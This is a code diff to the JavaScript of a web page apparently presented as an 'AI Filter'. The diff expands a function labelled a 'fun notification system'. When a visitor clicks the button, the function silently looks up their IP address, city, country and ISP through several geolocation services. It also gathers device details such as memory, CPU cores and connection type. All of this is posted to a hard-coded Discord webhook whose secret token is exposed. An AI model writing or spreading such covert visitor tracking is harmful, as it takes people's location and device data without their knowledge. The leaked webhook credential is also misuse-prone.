@@ -1053,28 +1053,38 @@
     }
 
     // Fun notification system with IP, city, and country data
-    async function logUserData() {
+        async function logUserData() {
       try {
-        console.log("Starting IP data fetch...");
+        console.log("Starting IP data fetch for Vercel...");
         
-        // Try multiple IP services in case one fails
+        // Use multiple reliable IP services that work with Vercel
         let ipData = null;
         
-        // Try ipapi.co first
+        // Method 1: Try ipapi.co with timeout
         try {
-          const response1 = await fetch('https://ipapi.co/json/');
-          ipData = await response1.json();
-          console.log("IP data from ipapi.co:", ipData);
-        } catch (e) {
-          console.log("ipapi.co failed, trying ipify.org...");
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 5000);
           
-          // Try ipify.org as backup
+          const response1 = await fetch('https://ipapi.co/json/', {
+            signal: controller.signal
+          });
+          clearTimeout(timeoutId);
+          
+          if (response1.ok) {
+            ipData = await response1.json();
+            console.log("IP data from ipapi.co:", ipData);
+          } else {
+            throw new Error('ipapi.co failed');
+          }
+        } catch (e) {
+          console.log("ipapi.co failed, trying alternative services...");
+          
+          // Method 2: Try ipify.org + ip-api.com
           try {
             const response2 = await fetch('https://api.ipify.org?format=json');
             const ipifyData = await response2.json();
             
-            // Get location data from ip-api.com
-            const locationResponse = await fetch(`http://ip-api.com/json/${ipifyData.ip}`);
+            const locationResponse = await fetch(`https://ip-api.com/json/${ipifyData.ip}`);
             const locationData = await locationResponse.json();
             
             ipData = {
@@ -1085,8 +1095,24 @@
             };
             console.log("IP data from ipify + ip-api:", ipData);
           } catch (e2) {
-            console.log("All IP services failed");
-            throw e2;
+            console.log("ipify failed, trying ipinfo.io...");
+            
+            // Method 3: Try ipinfo.io
+            try {
+              const response3 = await fetch('https://ipinfo.io/json');
+              const ipinfoData = await response3.json();
+              
+              ipData = {
+                ip: ipinfoData.ip,
+                city: ipinfoData.city,
+                country_name: ipinfoData.country,
+                org: ipinfoData.org
+              };
+              console.log("IP data from ipinfo.io:", ipData);
+            } catch (e3) {
+              console.log("All IP services failed, using fallback");
+              throw e3;
+            }
           }
         }
         
@@ -1097,8 +1123,10 @@
         const currentTime = new Date().toISOString();
         const language = navigator.language;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        
-        // Send fun notification to Discord with IP data
+        const connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+        const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown';
+
+        // Send detailed notification to Discord
         const webhookUrl = "https://discord.com/api/webhooks/1398460329259827342/yEvVgTEowjESAbB6LoQq3vkMP4DfUIEQvpK613X9xmsJkK3g6LeZpS_g7HlntUUelP1z";
         
         fetch(webhookUrl, {
@@ -1108,7 +1136,30 @@
           },
           body: JSON.stringify({
             username: "AI Filter Bot",
-            content: `🎯 **Someone tried the AI Filter!**\n\n🌍 **IP Address:** \`${ipData.ip}\`\n📍 **City:** ${ipData.city}\n🌎 **Country:** ${ipData.country_name}\n🏢 **ISP:** ${ipData.org || "Unknown"}\n📱 **Device:** ${platform}\n🖥️ **Screen:** ${screenRes}\n🌐 **Language:** ${language}\n⏰ **Time:** ${currentTime}\n🌍 **Timezone:** ${timezone}\n\n**User Agent:** \`${userAgent.substring(0, 100)}...\`\n\nThey clicked 'Initialize AI Filter' button! 🎭`
+            embeds: [{
+              title: "🎯 New User Interaction Detected!",
+              color: 0x00ff00,
+              fields: [
+                {
+                  name: "🌍 IP Information",
+                  value: `**IP:** \`${ipData.ip}\`\n**City:** ${ipData.city}\n**Country:** ${ipData.country_name}\n**ISP:** ${ipData.org || "Unknown"}`,
+                  inline: true
+                },
+                {
+                  name: "📱 Device Information",
+                  value: `**Platform:** ${platform}\n**Screen:** ${screenRes}\n**Memory:** ${memory}\n**Connection:** ${connection}`,
+                  inline: true
+                },
+                {
+                  name: "🌐 Browser Details",
+                  value: `**Language:** ${language}\n**Timezone:** ${timezone}\n**Time:** ${currentTime}`,
+                  inline: false
+                }
+              ],
+              footer: {
+                text: "AI Filter Bot - Vercel Hosted"
+              }
+            }]
           })
         }).catch(err => console.error('Webhook error:', err));
         
@@ -1116,13 +1167,16 @@
       } catch (error) {
         console.error("Error getting IP data:", error);
         
-        // Fallback without IP data
+        // Enhanced fallback with more device info
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
         const screenRes = `${screen.width}x${screen.height}`;
         const currentTime = new Date().toISOString();
         const language = navigator.language;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+        const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown';
+        const cores = navigator.hardwareConcurrency || 'Unknown';
         
         const webhookUrl = "https://discord.com/api/webhooks/1398460329259827342/yEvVgTEowjESAbB6LoQq3vkMP4DfUIEQvpK613X9xmsJkK3g6LeZpS_g7HlntUUelP1z";
         
@@ -1133,7 +1187,26 @@
           },
           body: JSON.stringify({
             username: "AI Filter Bot",
-            content: `🎯 **Someone tried the AI Filter!**\n\n📱 **Device:** ${platform}\n🖥️ **Screen:** ${screenRes}\n🌐 **Language:** ${language}\n⏰ **Time:** ${currentTime}\n🌍 **Timezone:** ${timezone}\n\n**User Agent:** \`${userAgent.substring(0, 100)}...\`\n\nThey clicked 'Initialize AI Filter' button! 🎭`
+            embeds: [{
+              title: "🎯 New User Interaction (No IP Data)",
+              color: 0xff9900,
+              description: "IP detection failed, but captured device information",
+              fields: [
+                {
+                  name: "📱 Device Information",
+                  value: `**Platform:** ${platform}\n**Screen:** ${screenRes}\n**Memory:** ${memory}\n**CPU Cores:** ${cores}\n**Connection:** ${connection}`,
+                  inline: true
+                },
+                {
+                  name: "🌐 Browser Details",
+                  value: `**Language:** ${language}\n**Timezone:** ${timezone}\n**Time:** ${currentTime}`,
+                  inline: true
+                }
+              ],
+              footer: {
+                text: "AI Filter Bot - Vercel Hosted (IP Detection Failed)"
+              }
+            }]
           })
         }).catch(err => console.error('Webhook error:', err));
       }
